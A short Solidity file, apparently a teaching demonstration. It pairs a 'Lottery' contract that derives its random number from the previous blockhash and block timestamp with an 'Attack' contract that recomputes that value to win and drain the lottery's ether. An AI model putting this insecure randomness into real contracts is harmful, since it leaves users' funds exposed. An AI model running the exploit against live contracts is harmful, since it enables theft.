//SPDX-License-Identifier: No-License

pragma solidity ^0.8.17;

contract Lottery {

    constructor() payable {}

    function guessToWin(uint _guess) external {

        uint randomAnswer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        if(randomAnswer == _guess) {
            selfdestruct(payable(msg.sender));
        }
    }
}

contract Attack {
    
    Lottery public lottery;
    constructor(address _lottery) {
        lottery = Lottery(_lottery);
    }

    function attack() external {
        uint randomAnswer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        lottery.guessToWin(randomAnswer);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}